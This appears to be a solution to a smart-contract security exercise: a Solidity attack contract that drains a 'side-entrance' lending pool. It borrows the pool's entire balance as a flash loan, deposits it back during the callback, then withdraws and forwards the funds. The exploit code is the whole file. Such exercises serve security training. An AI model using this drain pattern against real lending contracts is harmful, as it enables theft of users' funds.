pragma solidity  ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntranceLenderPool {
    address payable immutable owner;
    SideEntranceLenderPool immutable pool;

    constructor(SideEntranceLenderPool _pool, address _owner) {
        owner = payable(_owner);
        pool = _pool;
    }

    function drain() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        owner.send(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive () external payable {}
}
